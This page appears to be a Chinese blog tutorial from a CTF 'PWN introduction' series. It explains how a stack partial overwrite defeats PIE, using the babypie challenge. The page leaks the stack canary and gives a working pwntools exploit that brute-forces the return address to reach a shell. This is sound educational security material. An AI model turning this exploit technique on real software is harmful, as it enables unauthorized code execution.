@@ -1,0 +1,277 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PWN入门（2-4-3）-花式栈溢出技巧-栈上的 partial overwrite（绕过PIE保护） | Cyberangel's Blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PWN入门（2-4-3）-花式栈溢出技巧-栈上的 partial overwrite（绕过PIE保护） 参考资料：https:&#x2F;&#x2F;eqqie.cn&#x2F;index.php&#x2F;laji_note&#x2F;1017&#x2F;CTF-wiki  PIE特征我们知道， 在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化， 但低位的偏移是始终固定的， 也就是说如果我们能更改低位的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN入门（2-4-3）-花式栈溢出技巧-栈上的 partial overwrite（绕过PIE保护）">
+<meta property="og:url" content="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-4-3%EF%BC%89-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7-%E6%A0%88%E4%B8%8A%E7%9A%84%20partial%20overwrite%EF%BC%88%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4%EF%BC%89/index.html">
+<meta property="og:site_name" content="Cyberangel&#39;s Blog">
+<meta property="og:description" content="PWN入门（2-4-3）-花式栈溢出技巧-栈上的 partial overwrite（绕过PIE保护） 参考资料：https:&#x2F;&#x2F;eqqie.cn&#x2F;index.php&#x2F;laji_note&#x2F;1017&#x2F;CTF-wiki  PIE特征我们知道， 在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化， 但低位的偏移是始终固定的， 也就是说如果我们能更改低位的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picsum.photos/seed/blog-cover-05/800/450">
+<meta property="article:published_time" content="2020-09-01T02:14:54.000Z">
+<meta property="article:modified_time" content="2026-07-03T14:46:15.805Z">
+<meta property="article:author" content="Cyberangel">
+<meta property="article:tag" content="二进制安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picsum.photos/seed/blog-cover-05/800/450"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PWN入门（2-4-3）-花式栈溢出技巧-栈上的 partial overwrite（绕过PIE保护）",
+  "url": "https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-4-3%EF%BC%89-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7-%E6%A0%88%E4%B8%8A%E7%9A%84%20partial%20overwrite%EF%BC%88%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4%EF%BC%89/",
+  "image": "https://picsum.photos/seed/blog-cover-05/800/450",
+  "datePublished": "2020-09-01T02:14:54.000Z",
+  "dateModified": "2026-07-03T14:46:15.805Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Cyberangel",
+      "url": "https://elydemiurge.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-4-3%EF%BC%89-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7-%E6%A0%88%E4%B8%8A%E7%9A%84%20partial%20overwrite%EF%BC%88%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4%EF%BC%89/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PWN入门（2-4-3）-花式栈溢出技巧-栈上的 partial overwrite（绕过PIE保护）',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Cyberangel's Blog" type="application/atom+xml">
+</head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://picsum.photos/seed/blog-cover-05/800/450);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Cyberangel's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">PWN入门（2-4-3）-花式栈溢出技巧-栈上的 partial overwrite（绕过PIE保护）</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门（2-4-3）-花式栈溢出技巧-栈上的 partial overwrite（绕过PIE保护）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-09-01T02:14:54.000Z" title="发表于 2020-09-01 10:14:54">2020-09-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-03T14:46:15.805Z" title="更新于 2026-07-03 22:46:15">2026-07-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/">公开知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">736</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>2分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PWN入门（2-4-3）-花式栈溢出技巧-栈上的-partial-overwrite（绕过PIE保护）"><a href="#PWN入门（2-4-3）-花式栈溢出技巧-栈上的-partial-overwrite（绕过PIE保护）" class="headerlink" title="PWN入门（2-4-3）-花式栈溢出技巧-栈上的 partial overwrite（绕过PIE保护）"></a>PWN入门（2-4-3）-花式栈溢出技巧-栈上的 partial overwrite（绕过PIE保护）</h1><blockquote>
+<p>参考资料：<a target="_blank" rel="noopener" href="https://eqqie.cn/index.php/laji_note/1017/">https://eqqie.cn/index.php/laji_note&#x2F;1017&#x2F;</a><br>CTF-wiki</p>
+</blockquote>
+<h2 id="PIE特征"><a href="#PIE特征" class="headerlink" title="PIE特征"></a>PIE特征</h2><p><span style="color: rgba(0, 0, 0, 0.87)">我们知道， 在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化， </span><span style="color: #F5222D">但低位的偏移是始终固定的， 也就是说如果我们能更改低位的偏移， 就可以在一定程度上控制程序的执行流</span><span style="color: rgba(0, 0, 0, 0.87)">，绕过 PIE 保护。</span></p>
+<blockquote>
+<p>partial overwrite不仅仅可以用在栈上，同样可以用在其它随机化的场景。比如堆的随机化，由于堆起始地址低字节一定是0x00，也可以通过覆盖低位来控制堆上的偏移。</p>
+</blockquote>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><span style="color: rgba(0, 0, 0, 0.87)">我们以CTF-wiki上的例题（</span><span style="color: rgba(0, 0, 0, 0.87)">安恒杯 2018 年 7 月月赛的 babypie </span><span style="color: rgba(0, 0, 0, 0.87)">）为例进行讲解：</span></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/partial_overwrite/babypie">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/partial_overwrite&#x2F;babypie</a></p>
+</blockquote>
+<p>首先检查一下文件的保护情况：</p>
+<p><img src="/assets/posts/pwn-2-4-3-partial-overwrite-pie-1yt7daz/assets/1598926840052-c1f563d5-3b42-48f4-9de9-214765dcd812.png" alt="QQ截图20200901101938.png"></p>
+<p>可以看到保护全开，并且开启了PIE保护，是64位程序</p>
+<p>先来运行一下程序：</p>
+<p><img src="/assets/posts/pwn-2-4-3-partial-overwrite-pie-1yt7daz/assets/1598927695298-292b6976-8ac4-4229-b3c0-2c4c544c98d0.png" alt="QQ截图20200901103448.png"></p>
+<p>可以看到，程序给了我们两次输入的机会。</p>
+<p>拖入IDA中，查看伪代码：</p>
+<p><img src="/assets/posts/pwn-2-4-3-partial-overwrite-pie-1yt7daz/assets/1598927402655-95484fe8-b0be-4d53-9749-3bbb7f6ce4fa.png" alt="QQ截图20200901102955.png"></p>
+<p>IDA 中看一下， 很容易就能发现漏洞点， 两处输入都有很明显的栈溢出漏洞。</p>
+<p>同时发现system(“&#x2F;bin&#x2F;sh”)：</p>
+<p><img src="/assets/posts/pwn-2-4-3-partial-overwrite-pie-1yt7daz/assets/1598927457227-33ac6f04-a1b4-49cb-bf83-2d6af788e68e.png" alt="QQ截图20200901103051.png"></p>
+<p>由于开启了PIE保护，但是地址的低位是不会发生变化的。我们记下system函数的低位为0x960。<span style="color: #314659">所以我们可以仅修改末尾的4位(因为每个字符相当于占两位 无法只修改三位)，这样就有一定的概率return到我们想要的system函数地址。</span></p>
+<p>溢出发生了两次，每次溢出可控制的字节不同。<strong><span style="color: #F5222D">同时read不设置截断符\x00，而Canary为了防止被泄露，最低位字节固定为0x00，那么可以额外读取一个字节覆盖canary的最低字节，达到泄露目的。</span></strong></p>
+<p><img src="/assets/posts/pwn-2-4-3-partial-overwrite-pie-1yt7daz/assets/1598951683470-b9dbfa16-531a-4f04-8d30-e145931ebb95.png" alt="QQ截图20200901171435.png"></p>
+<p>大致利用思路已经很明了了：</p>
+<p>第一次溢出用sendline把canary最后一个字节覆盖为换行符\x0a，然后从输出中读到canary+0xa，减去0xa得到canary。</p>
+<p>第二次溢出运用上一步的canary覆盖canary所在的栈上位置并继续向后溢出，覆盖return地址低两位字节。</p>
+<p>由于return地址低两位字节中有4 bits是无法控制的，也就是是随机的，好在范围不大，随便填一个靠点运气就能getshell。（也就是覆盖返回地址为0x?a3e，概率碰撞）</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./babypie&quot;</span>, timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#  gdb.attach(p)</span></span><br><span class="line">        p.sendafter(<span class="string">&quot;:\n&quot;</span>, <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x8</span> + <span class="number">1</span>))</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x8</span> + <span class="number">1</span>))</span><br><span class="line">        canary = <span class="string">&#x27;\0&#x27;</span> + p.recvn(<span class="number">7</span>)</span><br><span class="line">        <span class="built_in">print</span> canary.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#  gdb.attach(p)</span></span><br><span class="line">        p.sendafter(<span class="string">&quot;:\n&quot;</span>, <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x8</span>) + canary + <span class="string">&#x27;bbbbbbbb&#x27;</span> + <span class="string">&#x27;\x3E\x0A&#x27;</span>)</span><br><span class="line">	    <span class="comment">#str+canary+ebp+ret</span></span><br><span class="line"></span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exceptpn <span class="keyword">as</span> e:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="built_in">print</span> e</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/posts/pwn-2-4-3-partial-overwrite-pie-1yt7daz/assets/1598952603695-62be8f5d-19e3-436c-be13-88addd017cde.png" alt="QQ截图20200901172952.png"></p>
+<p>getshell</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-4-3%EF%BC%89-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7-%E6%A0%88%E4%B8%8A%E7%9A%84%20partial%20overwrite%EF%BC%88%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4%EF%BC%89/">https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-4-3%EF%BC%89-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7-%E6%A0%88%E4%B8%8A%E7%9A%84%20partial%20overwrite%EF%BC%88%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://elydemiurge.github.io" target="_blank">Cyberangel's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://picsum.photos/seed/blog-cover-05/800/450" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/IDA%20&amp;&amp;%20OD%20%E5%AD%A6%E4%B9%A0/IDA%20Pro%E5%AD%A6%E4%B9%A0/IDA%20Pro7.0%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/" title="IDA Pro7.0使用技巧总结"><img class="cover" src="https://picsum.photos/seed/blog-cover-07/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">IDA Pro7.0使用技巧总结</div></div><div class="info-2"><div class="info-item-1">IDA Pro7.0使用技巧总结 转载自：https://xz.aliyun.com/t/4205  俗话说，工欲善其事，必先利其器，在二进制安全的学习中，使用工具尤为重要，而IDA又是玩二进制的神器，以前在使用IDA的时候，只是用几个比较常用的功能，对于IDA的其他功能没有去研究，于是本着学习的精神，参考着《IDA pro权威指南》(第二版)，写下这篇文章，记录自己的学习心得，下面的记录都是在Windows平台下的IDA pro7.0进行的 一些二进制工具在《IDA pro权威指南》的开篇一两章中，先是介绍了几款常用于二进制研究的工具，我这里简单的记了几个，介绍一波：  C++filt：可以用于显示出c++中复杂的重载后的函数名称 PE tools：是一组用于分析Windows系统中正在运行的进程和可执行文件的工具 string：可以用于直接搜索出elf文件中的所有字符串  参数-a 表示搜索整个文件，参数-t 可以显示出每一个字符串的偏移，参数-e 可以用于搜索更多的字符编码的字符串，如Unicode编码  strip：可用于elf去符号，去符号后仍然保持正常功能但增加了逆向...</div></div></div></a><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-4-2%EF%BC%89-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7-Stack%20pivoting%EF%BC%88%E6%A0%88%E7%BF%BB%E8%BD%AC%EF%BC%89/" title="PWN入门（2-4-2）-花式栈溢出技巧-Stack pivoting（栈翻转）"><img class="cover" src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">PWN入门（2-4-2）-花式栈溢出技巧-Stack pivoting（栈翻转）</div></div><div class="info-2"><div class="info-item-1">PWN入门（2-4-2）-花式栈溢出技巧-Stack pivoting（栈翻转） 参考资料：https://wiki.x10sec.org/pwn/stackoverflow/others/#stack-pivotinghttps://www.cnblogs.com/17bdw/p/7898905.html  1、介绍我们首先介绍一下Stack pivoting的含义： 正如它的中文意思一样，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting：  可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链 开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用  此外，利用 stack pivoting 有以下几个要求  可以控制程序执行流。 可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是   pop rsp&#x2F;esp...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Cyberangel</div><div class="author-info-description">二进制安全</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElyDemiurge"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElyDemiurge" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:elydemiurge@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">从语雀迁移博客到 Github</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E5%85%A5%E9%97%A8%EF%BC%882-4-3%EF%BC%89-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7-%E6%A0%88%E4%B8%8A%E7%9A%84-partial-overwrite%EF%BC%88%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">PWN入门（2-4-3）-花式栈溢出技巧-栈上的 partial overwrite（绕过PIE保护）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PIE%E7%89%B9%E5%BE%81"><span class="toc-number">1.1.</span> <span class="toc-text">PIE特征</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.2.</span> <span class="toc-text">示例</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"><img src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"/></a><div class="content"><a class="title" 